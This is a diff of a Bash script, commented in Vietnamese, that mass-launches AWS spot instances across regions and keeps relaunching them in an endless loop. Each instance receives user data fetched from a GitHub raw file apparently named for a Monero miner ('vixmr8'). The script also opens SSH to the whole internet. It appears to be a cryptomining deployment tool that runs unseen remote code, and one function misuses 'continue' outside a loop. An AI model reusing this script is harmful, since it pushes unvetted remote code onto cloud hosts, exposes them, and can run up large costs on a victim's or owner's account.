@@ -1,115 +1,121 @@
+
 #!/bin/bash
 
-# List of regions and corresponding AMI IDs
+# Danh sách AMI theo vùng AWS
 declare -A region_image_map=(
     ["us-east-1"]="ami-0e2c8caa4b6378d8c"
     ["us-west-2"]="ami-05d38da78ce859165"
-    ["us-east-2"]="ami-0cb91c7de36eed2cb"
+    ["ap-southeast-1"]="ami-0672fd5b9210aa093"
 )
 
-# URL containing User Data on GitHub
+# URL chứa User Data trên GitHub
 user_data_url="https://raw.githubusercontent.com/kiemtien1/test/refs/heads/main/vixmr8"
-
-# Path to User Data file
 user_data_file="/tmp/user_data.sh"
 
-# Download User Data from GitHub
-echo "Downloading user-data from GitHub..."
+# Cấu hình cho Spot Instances
+INSTANCE_TYPE="c3.2xlarge"
+SPOT_PRICE="0.5"  # Giá thầu tối đa cho Spot Instance
+INSTANCE_COUNT=1   # Số lượng instances mỗi vùng
+
+# Tải User Data từ GitHub
+echo "📥 Đang tải User Data từ GitHub..."
 curl -s -L "$user_data_url" -o "$user_data_file"
 
-# Check if file exists and is not empty
+# Kiểm tra file User Data
 if [ ! -s "$user_data_file" ]; then
-    echo "Error: Failed to download user-data from GitHub."
+    echo "❌ Lỗi: Không thể tải User Data từ GitHub."
     exit 1
 fi
 
-# Encode User Data to base64 for AWS use
+# Encode User Data sang base64
 user_data_base64=$(base64 -w 0 "$user_data_file")
 
-# Iterate over each region
-for region in "${!region_image_map[@]}"; do
-    echo "Processing region: $region"
+# Function: Kiểm tra và khởi động lại Spot Instances
+monitor_and_restart() {
+    REGION=$1
+    echo "🔍 Kiểm tra Spot Instances ở $REGION..."
 
-    # Get the image ID for the region
-    image_id=${region_image_map[$region]}
+    # Lấy danh sách Spot Instance Requests đang chạy
+    RUNNING_INSTANCES=$(aws ec2 describe-spot-instance-requests \
+        --region "$REGION" \
+        --query "SpotInstanceRequests[?State=='active'].InstanceId" \
+        --output text)
 
-    # Check if Key Pair exists
-    key_name="keyname01-$region"
-    if aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
-        echo "Key Pair $key_name already exists in $region"
+    # Nếu không có Instance nào đang chạy, tạo lại Spot Request
+    if [ -z "$RUNNING_INSTANCES" ]; then
+        echo "⚠️ Không có Spot Instance nào chạy ở $REGION, đang khởi động lại..."
+        start_spot_instance "$REGION"
     else
-        aws ec2 create-key-pair \
-            --key-name "$key_name" \
-            --region "$region" \
-            --query "KeyMaterial" \
-            --output text > "${key_name}.pem"
-        chmod 400 "${key_name}.pem"
-        echo "Key Pair $key_name created in $region"
+        echo "✅ Spot Instances đang chạy bình thường ở $REGION."
+    fi
+}
+
+# Function: Khởi tạo Spot Instance
+start_spot_instance() {
+    REGION=$1
+    IMAGE_ID=${region_image_map[$REGION]}
+    KEY_NAME="SpotKeydh-$REGION"
+    SG_NAME="SpotSecurityGroup-$REGION"
+
+    # Kiểm tra & Tạo Key Pair nếu chưa tồn tại
+    if ! aws ec2 describe-key-pairs --key-names "$KEY_NAME" --region "$REGION" > /dev/null 2>&1; then
+        aws ec2 create-key-pair --key-name "$KEY_NAME" --region "$REGION" --query "KeyMaterial" --output text > "${KEY_NAME}.pem"
+        chmod 400 "${KEY_NAME}.pem"
+        echo "✅ Key Pair $KEY_NAME đã tạo ở $REGION"
     fi
 
-    # Check if Security Group exists
-    sg_name="Random-$region"
-    sg_id=$(aws ec2 describe-security-groups --group-names "$sg_name" --region "$region" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)
-
-    if [ -z "$sg_id" ]; then
-        sg_id=$(aws ec2 create-security-group \
-            --group-name "$sg_name" \
-            --description "Security group for $region" \
-            --region "$region" \
-            --query "GroupId" \
-            --output text)
-        echo "Security Group $sg_name created with ID $sg_id in $region"
-    else
-        echo "Security Group $sg_name already exists with ID $sg_id in $region"
+    # Kiểm tra & Tạo Security Group nếu chưa có
+    SG_ID=$(aws ec2 describe-security-groups --group-names "$SG_NAME" --region "$REGION" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)
+    
+    if [ -z "$SG_ID" ]; then
+        SG_ID=$(aws ec2 create-security-group --group-name "$SG_NAME" --description "Spot Security Group" --region "$REGION" --query "GroupId" --output text)
+        aws ec2 authorize-security-group-ingress --group-id "$SG_ID" --protocol tcp --port 22 --cidr 0.0.0.0/0 --region "$REGION"
+        echo "✅ Security Group $SG_NAME đã tạo ở $REGION"
     fi
 
-    # Ensure SSH (22) port is open
-    if ! aws ec2 describe-security-group-rules --region "$region" --filters Name=group-id,Values="$sg_id" Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
-        aws ec2 authorize-security-group-ingress \
-            --group-id "$sg_id" \
-            --protocol tcp \
-            --port 22 \
-            --cidr 0.0.0.0/0 \
-            --region "$region"
-        echo "SSH (22) access enabled for Security Group $sg_name in $region"
-    else
-        echo "SSH (22) access already configured for Security Group $sg_name in $region"
-    fi
-
-    # Automatically select an available Subnet ID for Auto Scaling Group
-    subnet_id=$(aws ec2 describe-subnets --region $region --query "Subnets[0].SubnetId" --output text)
-
-    if [ -z "$subnet_id" ]; then
-        echo "No available Subnet found in $region. Skipping region."
+    # Lấy Subnet ID khả dụng
+    SUBNET_ID=$(aws ec2 describe-subnets --region "$REGION" --query "Subnets[0].SubnetId" --output text)
+    if [ -z "$SUBNET_ID" ]; then
+        echo "❌ No available Subnet found in $REGION. Skipping..."
         continue
     fi
 
-    echo "Using Subnet ID $subnet_id for Auto Scaling Group in $region"
+    echo "🟢 Using Subnet ID: $SUBNET_ID"
 
-    # Create Auto Scaling Group with selected Subnet ID
-    asg_name="SpotASG-$region"
-    aws autoscaling create-auto-scaling-group \
-        --auto-scaling-group-name $asg_name \
-        --launch-template "LaunchTemplateId=$launch_template_id,Version=1" \
-        --min-size 1 \
-        --max-size 10 \
-        --desired-capacity 1 \
-        --vpc-zone-identifier "$subnet_id" \
-        --region $region
-    echo "Auto Scaling Group $asg_name created in $region"
+    # Gửi yêu cầu Spot Instances
+    SPOT_REQUEST_ID=$(aws ec2 request-spot-instances \
+    --spot-price "$SPOT_PRICE" \
+    --instance-count "$INSTANCE_COUNT" \
+    --type "one-time" \
+    --launch-specification "{
+        \"ImageId\": \"$IMAGE_ID\",
+        \"InstanceType\": \"$INSTANCE_TYPE\",
+        \"KeyName\": \"$KEY_NAME\",
+        \"SecurityGroupIds\": [\"$SG_ID\"],
+        \"SubnetId\": \"$SUBNET_ID\",
+        \"UserData\": \"$user_data_base64\"
+    }" \
+    --region "$REGION" \
+    --query "SpotInstanceRequests[*].SpotInstanceRequestId" \
+    --output text)
 
-    # Launch 1 On-Demand EC2 Instance
-    instance_id=$(aws ec2 run-instances \
-        --image-id "$image_id" \
-        --count 1 \
-        --instance-type c7a.2xlarge \
-        --key-name "$key_name" \
-        --security-group-ids "$sg_id" \
-        --user-data "$user_data_base64" \
-        --region "$region" \
-        --query "Instances[0].InstanceId" \
-        --output text)
 
-    echo "On-Demand Instance $instance_id created in $region using Key Pair $key_name and Security Group $sg_name"
+    if [ -n "$SPOT_REQUEST_ID" ]; then
+        echo "✅ Spot Request Created: $SPOT_REQUEST_ID"
+    else
+        echo "❌ Không thể tạo Spot Request ở $REGION" >&2
+    fi
+}
 
+# Chạy lần đầu để khởi tạo Spot Instances
+for REGION in "${!region_image_map[@]}"; do
+    start_spot_instance "$REGION"
+done
+
+# Giám sát liên tục và tự động khởi động lại nếu Spot Instance bị đóng
+while true; do
+    for REGION in "${!region_image_map[@]}"; do
+        monitor_and_restart "$REGION"
+    done
+    sleep 300  # Kiểm tra mỗi 5 phút
 done
